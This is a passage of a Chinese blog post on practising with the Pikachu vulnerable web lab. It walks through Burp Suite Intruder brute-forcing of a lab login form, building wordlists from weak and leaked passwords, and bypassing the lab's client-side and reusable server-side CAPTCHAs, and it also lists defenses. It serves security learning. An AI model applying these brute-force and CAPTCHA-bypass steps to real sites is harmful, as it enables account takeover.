<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-49-14.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-58-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-04-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-07-48.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-19-52.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-24-59.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-27-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-34-21.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-39-55.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-45-23.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-48-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-57-01.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-01-38.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-04-10.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-06-46.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-46-09.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-48-33.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-52-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-54-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-56-37.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-59-43.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-04-25.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-07-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-09-29.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-10-49.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-15-23.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-38-14.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-39-28.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-44-06.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-48-46.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-01-52.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-17-31.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-20-13.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-29-23.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-30-22.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-35-16.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-37-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-43-35.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-45-48.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-55-27.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-57-26.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-07-30.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-10-52.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-24-38.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-28-44.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-09-51-43.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-09-56-04.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-11-18.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-15-35.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-17-43.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-38-56.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-13-18-19.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-12-14-40.png">
<meta property="og:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-12-15-39.png">
<meta property="article:published_time" content="2023-03-06T09:03:16.000Z">
<meta property="article:modified_time" content="2023-03-14T05:22:47.211Z">
<meta property="article:author" content="Jay jay">
<meta property="article:tag" content="学习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/1.jpg">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
    <link rel="stylesheet" href="/css/style.css?v=1681885929794">
    
    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681885929794">
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="mdui-drawer-body-left">
    
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(/assets/background.gif)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="Jay jay" class="mdui-btn mdui-btn-icon"><img src="/assets/avatar.jpg" alt="Jay jay"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Jay jay">
            <img src="/assets/avatar.jpg" alt="Jay jay" alt="Jay jay">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>28</div>
        <div><span>标签</span>2</div>
        <div><span>分类</span>0</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://www.baidu.com/s?wd=" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://space.bilibili.com/436182677" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/yyj-xx/yyj-xx.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
    
    
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 20px;">学习</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E5%86%99%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">学习写博客</a>
    </div>
    
  </div>

    
    

    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2023 Jay jay
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        <br>人生需要不断的探索
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
      
          <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
              <img data-src="/assets/background.gif" data-sizes="auto" alt="pikachu靶场的学习" class="lazyload">
              <h1>pikachu靶场的学习</h1>
          </div>
      
      
      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
    <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月06日</a>
    <a><i class="nexmoefont icon-areachart"></i>19.3k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 82 分钟</a>
</div>

      

      <h1 id="pikachu靶场的学习"><a href="#pikachu靶场的学习" class="headerlink" title="pikachu靶场的学习"></a>pikachu靶场的学习</h1><h2 id="pikachu介绍"><a href="#pikachu介绍" class="headerlink" title="pikachu介绍"></a>pikachu介绍</h2><p>pikachu是一个网络安全学习的靶场，集合了常见web安全的漏洞，很适合初学者进行学习。</p>
<p>pikachu靶场下载链接为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs reStructuredText">https://github.com/zhuifengshaonianhanlu/pikachu<br></code></pre></td></tr></table></figure>

<h2 id="pikachu靶场的搭建"><a href="#pikachu靶场的搭建" class="headerlink" title="pikachu靶场的搭建"></a>pikachu靶场的搭建</h2><p>首先下载安装phpstudy，从下载链接中下载好pikachu源码，解压到phpstudy的www目录下，完成配置与初始化即可。</p>
<p>安装可参考这篇文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs reStructuredText">https://blog.csdn.net/weixin_42474304/article/details/117533788<br></code></pre></td></tr></table></figure>

<h2 id="pikachu靶场实战练习"><a href="#pikachu靶场实战练习" class="headerlink" title="pikachu靶场实战练习"></a>pikachu靶场实战练习</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>简单来说就是尝试不同的用户名和密码来进行尝试去碰撞真是存在的用户和密码，人工尝试是不可能快速的实现，所以要基于工具自动化来帮我们快速猜出账号和密码。暴力破解=连续尝试+字典+自动化。</p>
<p>字典是暴力破解中的重中之重，一本好的字典可以大大提高破解速度：</p>
<ul>
<li>常用的账号密码（弱口令）</li>
<li>互联网上被脱裤后的账号密码（社工库）</li>
<li>对网站管理者进行信息收集，利用收集的信息实用密码生成工具进行密码字典的生成。</li>
</ul>
<p>一个网站理论上在攻击者有足够强大的计算能力和时间的前提下都是可以被暴力破解拿到网站的后台管理权限。所以我们对一个web系统存在暴力破解漏洞一般指的是该web系统没有采用或采用了较弱的安全策略，从而导致被暴力破解的可能性高。这里安全策略包括：</p>
<ol>
<li><p>是否要求用户设置复杂的密码</p>
</li>
<li><p>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp</p>
</li>
<li><p>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等</p>
</li>
<li><p>是否采用了双因素认证</p>
<p>..等等</p>
</li>
</ol>
<p>存在暴力破解漏洞的网站会遭到暴力破解但成功的可能性并不是100%。</p>
<h4 id="暴力破解的流程"><a href="#暴力破解的流程" class="headerlink" title="暴力破解的流程"></a>暴力破解的流程</h4><ol>
<li><p>确认是否存在暴力破解漏洞：确认目标是否存在暴力破解的可能性，如抓包观察验证元素和response信息，判断暴力破解可能性。</p>
</li>
<li><p>对字典的配置：</p>
<p>根据实际情况对字典配置提高暴破成功率：</p>
<ul>
<li>根据注册信息进行优化，对目标站点进行注册，搞清账号密码限制，如：用户名密码长度，字母数字组合，按照此要求去除字典中不符合要求的密码</li>
<li>如暴破管理后台，往往网站模板默认的管理员账号（admin、administrator、root）的机率比较大，可以使用这三个账号加密码进行尝试登录，观察返回结果确定用户名</li>
</ul>
<p>如：提示用户名密码错误则两项都错，提示密码错误则用户名正确只对密码进行暴破</p>
</li>
<li><p>自动化工具的使用：</p>
<p>配置自动化工具（时间、线程、重试次数、ip等），进行自动化操作，常用的工具有burpsuite</p>
</li>
</ol>
<h4 id="基于表单的暴力破解流程和配置工具过程"><a href="#基于表单的暴力破解流程和配置工具过程" class="headerlink" title="基于表单的暴力破解流程和配置工具过程"></a>基于表单的暴力破解流程和配置工具过程</h4><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/1.jpg" alt="基于表单暴力破解靶场" class="lazyload"><br>测试目标：pikachu靶场的表单暴力破解<br>测试工具：burpsuite抓包工具(<a target="_blank" rel="noopener" href="https://portswigger.net/burp/download.html">https://portswigger.net/burp/download.html</a>)</p>
<p>进行简单的登录尝试：(会提示用户名和密码不存在)登录失败<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-17-20.png" alt="登录尝试" class="lazyload"><br>在burp抓到的包中我们可以看到是一个post请求<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-29-43.png" alt="抓取数据包" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-33-49.png" alt="查看数据包内容" class="lazyload"><br>可以在intercept中看到所抓的包的最后一行有用户名a密码为a<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-41-08.png" alt="响应数据包" class="lazyload"><br>正常的响应返回登录失败的页面<br>选中这条post请求右键并发送到intruder中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-45-33.png" alt="发送到intruder中" class="lazyload"><br>在选项卡中选中intruder选项，清楚原始数据包中的变量，然后选中用户名和密码点击Add$将其设置为变量<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-50-31.png" alt="清楚变量" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-16-59-26.png" alt="添加变量" class="lazyload"><br>在攻击模式选项中(attack type)中有四种模式：</p>
<ul>
<li>Sniper模式逻辑：先将第一个变量也就是用户名替换，第二个变量不动。当第一个变量替换完之后，对第二个变量进行依次替换。直白一点就是说一个变，另外一个不变，第一个变完，变第二个。</li>
<li>Battering ram模式逻辑：所有变量进行同时同样的替换。就是说你变我也变，你变什么我也变什么。</li>
<li>Pitchfork模式逻辑：所有变量同时替换，但是各自变量替换各自的字典，同时进行，但是互不相干。替换时第一个变量的第一替换值对应第二个变量的第一个替换值，不进行排列组合，就是1对1，2对2。不会将密码进行随机的排列组合。</li>
<li>Cluster bomb模式逻辑：与Pitchfork模式逻辑类似，不同点是Cluster bomb模式会进行随机的排列组合。</li>
</ul>
<p>在这里我们选择Cluster bomb模式进行暴破，在Payloads中配置第一个变量和第二个变量的字典，这里可以手动输入添加，也可以在系统中添加已经写好的字典。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-18-03.png" alt="配置" class="lazyload"><br>添加字典后进行攻击，根据返回数据包的长度进行判断是否成功。为了方便观察也可以Options选项中的grep-match中删除原有字符串，添加username or password is not exists，burp就会将所有含有此字符串的数据包flag出来。没有被flag出的数据包则是我们破解成功的数据包。点击username or password is not exists进行排序，没有勾选的则表明破解成功，有勾选的则表明破解失败。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-35-28.png" alt="攻击结果" class="lazyload"><br>用成功破解的用户名：admin 密码：123456登录，login success：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-08-17-37-29.png" alt="验证" class="lazyload"></p>
<h4 id="暴力破解之不安全的验证码分析—on-client—on-server"><a href="#暴力破解之不安全的验证码分析—on-client—on-server" class="headerlink" title="暴力破解之不安全的验证码分析—on client—on server"></a>暴力破解之不安全的验证码分析—on client—on server</h4><p><strong>验证码的作用：</strong> 防止登录暴力破解、防止机器恶意注册账号<br><strong>验证码的认证流程：</strong></p>
<ul>
<li><p>客户端请求登录页面后端生成验证码：</p>
<ol>
<li>后端使用算法生成图片，并将图片响应给客户端</li>
<li>同时将算法生成的值全局赋值存到SESSION中</li>
</ol>
</li>
<li><p>校验验证码：</p>
<ol>
<li>客户端将信息和验证码一起提交</li>
<li>后端对提交的验证码和session中的验证码值比较</li>
</ol>
</li>
<li><p>客户端刷新页面，生成新的验证码：<br>验证码生成的算法中包含随机生成函数，每次刷新重新生成</p>
</li>
</ul>
<h5 id="只在前端验证的验证码（on-client）"><a href="#只在前端验证的验证码（on-client）" class="headerlink" title="只在前端验证的验证码（on client）"></a>只在前端验证的验证码（on client）</h5><p>打开靶场，随便输入用户名和密码，加上正确的验证码，并用burp抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-39-04.png" alt="登录信息" class="lazyload"><br>提示登录失败页面刷新验证码更新<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-40-08.png" alt="验证码刷新" class="lazyload"><br>抓包信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-45-25.png" alt="抓包信息" class="lazyload"><br>查看源码可以看到验证码是在前端生成并且验证也在前端<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-51-55.png" alt="生成和验证验证码" class="lazyload"><br>将数据包发送到repeater模块中判断后端是否对验证码进行了校验，修改数据包中验证码的值，点击go可以看到返回的页面只有用户名和密码错误并没有验证码错误的提示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-14-57-39.png" alt="验证是否有后台检验" class="lazyload"><br>这可以判定这个验证码的验证方式为前端验证并没有后验证，是通过JavaScript实现的验证码，对于不懂安全的人来说，可以起到一定的防范作用。但对于知道这个原理的人来说形同虚设。然后的操作就和基于表单的流程一样，发送数据包到Intruder中，选用Cluster bomb模式修改变量，因为验证码后台并不校验没有用，所以只用选择用户名与密码。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-03-29.png" alt="暴破" class="lazyload"><br>配置字典开始暴破，通过长度排序找到正确的用户名和密码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-08-49.png" alt="暴破过程" class="lazyload"><br>输入用户名密码和正确的验证码登录成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-11-44.png" alt="登录成功" class="lazyload"><br><strong>（on-client）这种方式存在的问题：</strong></p>
<ul>
<li>使用前端js实现验证码(纸老虎)</li>
<li>将验证码在cookie中泄露,容易被获取</li>
<li>将验证码在前端源代码中泄露，容易被获取</li>
</ul>
<h5 id="在后端校验的验证码（on-server）"><a href="#在后端校验的验证码（on-server）" class="headerlink" title="在后端校验的验证码（on server）"></a>在后端校验的验证码（on server）</h5><p>同样的在靶场中随机输入用户名和密码输入正确的验证码，并抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-17-44.png" alt="输入信息" class="lazyload"><br>登录失败验证码发生变化<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-18-55.png" alt="验证码变化" class="lazyload"><br>将该数据包发送到repeater中修改验证码查看返回页面信息（改为空提示验证码不能为空）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-24-17.png" alt="验证码不能为空" class="lazyload"><br>随便输入验证码提示验证码错误<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-26-08.png" alt="验证码错误" class="lazyload"><br>经过判断发现后端对验证码进行了判断，这样是否就没有问题了？显然不是这样，从表面上看没有问题，但是我们还需要对验证码是否在后台过期进行进一步验证。首先先点击验证码，获取一个新的验证码，并将其记下来。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-31-16.png" alt="获取新验证码" class="lazyload"><br>然后将返回数据包中输入正确的验证码点击go，提示用户名和密码不存在<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-34-12.png" alt="返回数据包" class="lazyload"><br>为了验证验证码是否一致有效，我们修改用户名和密码，验证码不变，点击运行，结果一样。说明验证码可以重复利用。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-35-40.png" alt="验证码是否可重复利用" 